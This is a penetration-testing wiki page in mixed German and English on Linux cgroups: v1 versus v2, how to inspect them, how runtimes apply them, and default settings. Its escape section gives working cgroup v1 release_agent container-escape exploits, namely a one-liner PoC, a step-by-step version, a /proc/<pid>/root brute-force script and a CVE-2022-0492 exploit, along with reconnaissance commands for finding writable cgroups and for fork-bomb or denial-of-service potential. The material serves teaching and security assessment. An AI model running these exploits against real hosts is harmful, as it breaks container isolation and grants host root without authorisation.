# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **Control-Gruppen** sind der Kernel‑Mechanismus, um Prozesse für Abrechnung, Begrenzung, Priorisierung und Richtliniendurchsetzung zu gruppieren. Wenn namespaces hauptsächlich die Sicht auf Ressourcen isolieren, dann regeln cgroups hauptsächlich, **wie viel** dieser Ressourcen ein Satz von Prozessen verbrauchen darf und, in manchen Fällen, **welche Ressourcenklassen** sie überhaupt nutzen dürfen. Containers verlassen sich ständig auf cgroups, selbst wenn der Benutzer nie direkt darauf schaut, weil so gut wie jede moderne runtime dem Kernel mitteilen muss: "diese Prozesse gehören zu diesem Workload, und dies sind die Ressourcenvorgaben, die auf sie angewendet werden".

This is why container engines place a new container into its own cgroup subtree. Once the process tree is there, the runtime can cap memory, limit the number of PIDs, weight CPU usage, regulate I/O, and restrict device access. In a production environment, this is essential both for multi-tenant safety and for simple operational hygiene. A container without meaningful resource controls may be able to exhaust memory, flood the system with processes, or monopolize CPU and I/O in ways that make the host or neighboring workloads unstable.

From a security perspective, cgroups matter in two separate ways. First, bad or missing resource limits enable straightforward denial-of-service attacks. Second, some cgroup features, especially in older **cgroup v1** setups, have historically created powerful breakout primitives when they were writable from inside a container.

## v1 Vs v2

There are two major cgroup models in the wild. **cgroup v1** exposes multiple controller hierarchies, and older exploit writeups often revolve around the weird and sometimes overly powerful semantics available there. **cgroup v2** introduces a more unified hierarchy and generally cleaner behavior. Modern distributions increasingly prefer cgroup v2, but mixed or legacy environments still exist, which means both models are still relevant when reviewing real systems.

The difference matters because some of the most famous container breakout stories, such as abuses of **`release_agent`** in cgroup v1, are tied very specifically to older cgroup behavior. A reader who sees a cgroup exploit on a blog and then blindly applies it to a modern cgroup v2-only system is likely to misunderstand what is actually possible on the target.

## Inspection

Die schnellste Möglichkeit, zu sehen, wo sich Ihre aktuelle Shell befindet, ist:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die Datei `/proc/self/cgroup` zeigt die cgroup-Pfade, die mit dem aktuellen Prozess verknüpft sind. Auf einem modernen cgroup v2 Host sieht man häufig einen einheitlichen Eintrag. Auf älteren oder hybriden Hosts können mehrere v1-Controller-Pfade angezeigt werden. Sobald Sie den Pfad kennen, können Sie die entsprechenden Dateien unter `/sys/fs/cgroup` prüfen, um Limits und die aktuelle Nutzung zu sehen.

Auf einem cgroup v2 Host sind die folgenden Befehle nützlich:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Diese Dateien zeigen, welche Controller existieren und welche an child cgroups delegiert werden. Dieses Delegationsmodell ist in rootless- und systemd-managed-Umgebungen relevant, in denen der runtime möglicherweise nur die Teilmenge der cgroup-Funktionalität kontrollieren kann, die die parent hierarchy tatsächlich delegiert.

## Lab

Eine Möglichkeit, cgroups in der Praxis zu beobachten, ist das Starten eines speicherbegrenzten Containers:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Sie können auch einen PID-beschränkten Container ausprobieren:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Diese Beispiele sind nützlich, weil sie das Runtime-Flag mit der Kernel-Dateischnittstelle verbinden. Die Runtime erzwingt die Regel nicht auf magische Weise; sie schreibt die relevanten cgroup-Einstellungen und überlässt es dem Kernel, sie gegen den Prozessbaum durchzusetzen.

## Verwendung der Runtime

Docker, Podman, containerd und CRI-O verlassen sich im normalen Betrieb auf cgroups. Die Unterschiede betreffen meist nicht, ob sie cgroups verwenden, sondern **welche Standardeinstellungen sie wählen**, **wie sie mit systemd interagieren**, **wie rootless-Delegation funktioniert**, und **wie viel der Konfiguration auf Engine-Ebene gegenüber der Orchestrierungsebene kontrolliert wird**.

In Kubernetes werden resource requests und limits letztlich zu cgroup-Konfigurationen auf dem Node. Der Weg vom Pod YAML zur Kernel-Durchsetzung verläuft über das kubelet, den CRI runtime und den OCI runtime, aber cgroups sind weiterhin der Kernel-Mechanismus, der die Regel letztlich anwendet. In Incus/LXC-Umgebungen werden cgroups ebenfalls stark genutzt, insbesondere weil system containers oft einen reicheren Prozessbaum und eher VM-ähnliche Betriebsannahmen offenlegen.

## Fehlkonfigurationen und Container-Escapes

Die klassische cgroup-Sicherheitsgeschichte ist der beschreibbare **cgroup v1 `release_agent`**-Mechanismus. In diesem Modell kann, wenn ein Angreifer in die richtigen cgroup-Dateien schreiben, `notify_on_release` aktivieren und den in `release_agent` gespeicherten Pfad kontrollieren kann, der Kernel beim Leeren der cgroup einen vom Angreifer gewählten Pfad in den initialen Namespaces des Hosts ausführen. Deshalb legen ältere Writeups so viel Gewicht auf die Schreibbarkeit von cgroup-Controllern, Mount-Optionen und Namespace-/Capability-Bedingungen.

Auch wenn `release_agent` nicht verfügbar ist, sind cgroup-Fehler weiterhin relevant. Zu weitreichender Gerätezugriff kann Host-Geräte vom Container aus zugänglich machen. Fehlende Memory- und PID-Limits können eine einfache Codeausführung in einen Host-DoS verwandeln. Schwache cgroup-Delegation in rootless-Szenarien kann Verteidiger außerdem in die Irre führen, indem sie eine Einschränkung annehmen, die die Runtime nie tatsächlich anwenden konnte.

### Hintergrund von `release_agent`

Die `release_agent`-Technik gilt nur für **cgroup v1**. Die Grundidee ist, dass, wenn der letzte Prozess in einer cgroup beendet wird und `notify_on_release=1` gesetzt ist, der Kernel das Programm ausführt, dessen Pfad in `release_agent` gespeichert ist. Diese Ausführung erfolgt in den **initial namespaces auf dem Host**, was eine beschreibbare `release_agent` zu einer Container-Escape-Primitive macht.

Damit die Technik funktioniert, benötigt der Angreifer in der Regel:

- eine beschreibbare **cgroup v1**-Hierarchie
- die Möglichkeit, eine untergeordnete cgroup zu erstellen oder zu verwenden
- die Möglichkeit, `notify_on_release` zu setzen
- die Möglichkeit, einen Pfad in `release_agent` zu schreiben
- einen Pfad, der aus Sicht des Hosts zu einer ausführbaren Datei aufgelöst wird

### Klassischer PoC

Der historische Einzeiler-PoC lautet:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Dieses PoC schreibt einen payload path in `release_agent`, löst cgroup release aus und liest anschließend die auf dem Host erzeugte Ausgabedatei aus.

### Verständliche Schritt-für-Schritt-Anleitung

Die gleiche Idee ist leichter zu verstehen, wenn sie in Schritte zerlegt wird.

1. Erstelle und bereite eine beschreibbare cgroup vor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifizieren Sie den Host-Pfad, der dem Container-Dateisystem entspricht:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Lege eine payload ab, die vom Host-Pfad sichtbar ist:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ausführung auslösen, indem die cgroup geleert wird:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die Folge ist eine Ausführung des payload auf dem Host mit host root privileges. In einem realen exploit schreibt der payload normalerweise eine proof file, startet eine reverse shell oder verändert den host state.

### Relative-Path-Variante unter Verwendung von `/proc/<pid>/root`

In einigen Umgebungen ist der host path zum container filesystem nicht offensichtlich oder wird vom storage driver verborgen. In diesem Fall kann der payload path über `/proc/<pid>/root/...` ausgedrückt werden, wobei `<pid>` eine Host-PID ist, die zu einem Prozess im aktuellen container gehört. Das ist die Grundlage der relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Der relevante Trick besteht hier nicht im brute force selbst, sondern in der Pfadform: `/proc/<pid>/root/...` erlaubt dem Kernel, eine Datei innerhalb des Container-Dateisystems aus dem Host-Namespace aufzulösen, selbst wenn der direkte Pfad zum Host-Speicher nicht im Voraus bekannt ist.

### CVE-2022-0492-Variante

Im Jahr 2022 zeigte CVE-2022-0492, dass das Schreiben in `release_agent` in cgroup v1 nicht korrekt auf `CAP_SYS_ADMIN` im **initialen** Benutzer-Namespace überprüft wurde. Das machte die Technik auf verwundbaren Kerneln deutlich leichter zugänglich, weil ein Container-Prozess, der eine cgroup-Hierarchie mounten konnte, `release_agent` schreiben konnte, ohne bereits im Benutzer-Namespace des Hosts privilegiert zu sein.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Auf einem verwundbaren Kernel führt der Host `/proc/self/exe` mit Root-Rechten des Hosts aus.

Für den praktischen Missbrauch solltest du zunächst prüfen, ob die Umgebung weiterhin beschreibbare cgroup-v1-Pfade oder gefährlichen Gerätezugriff offenlegt:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Wenn `release_agent` vorhanden und beschreibbar ist, befindest du dich bereits im legacy-breakout-Gebiet:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Wenn der cgroup-Pfad selbst keinen escape ermöglicht, besteht der nächste praktische Nutzen oft in denial of service oder reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Diese Befehle zeigen schnell, ob der workload Platz hat, um einen fork-bomb auszulösen, Speicher aggressiv zu verbrauchen oder eine writable legacy cgroup interface zu missbrauchen.

## Checks

Beim Überprüfen eines Ziels ist der Zweck der cgroup checks, herauszufinden, welches cgroup model verwendet wird, ob der container writable controller paths sieht und ob alte breakout primitives wie `release_agent` überhaupt relevant sind.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Was hier interessant ist:

- Wenn `mount | grep cgroup` **cgroup v1** anzeigt, werden ältere breakout-writeups relevanter.
- Wenn `release_agent` existiert und erreichbar ist, ist das sofort eine Untersuchung wert.
- Wenn die sichtbare cgroup-Hierarchie beschreibbar ist und der Container außerdem starke capabilities hat, verdient die Umgebung eine genauere Prüfung.

Wenn Sie **cgroup v1**, beschreibbare Controller-Mounts und einen Container finden, der außerdem starke capabilities oder schwachen seccomp/AppArmor-Schutz hat, verdient diese Kombination besondere Beachtung. cgroups werden oft als langweiliges Resource-Management-Thema behandelt, aber historisch waren sie Teil einiger der lehrreichsten container escape chains, gerade weil die Grenze zwischen "Ressourcenkontrolle" und "Host-Einfluss" nicht immer so sauber war, wie man annahm.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | Auslassen von `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, gelockerter Gerätezugriff, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | Auslassen von `resources.requests`/`resources.limits`, privilegierter Gerätezugriff, Fehlkonfiguration der Runtime auf Host-Ebene |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direkte Runtime-Konfigurationen, die Gerätekontrollen lockern oder legacy beschreibbare cgroup v1-Interfaces offenlegen |

Die wichtige Unterscheidung ist, dass **das Vorhandensein von cgroups** in der Regel Standard ist, während **nützliche Ressourcengrenzen** oft optional sind, sofern sie nicht explizit konfiguriert wurden.
{{#include ../../../../banners/hacktricks-training.md}}
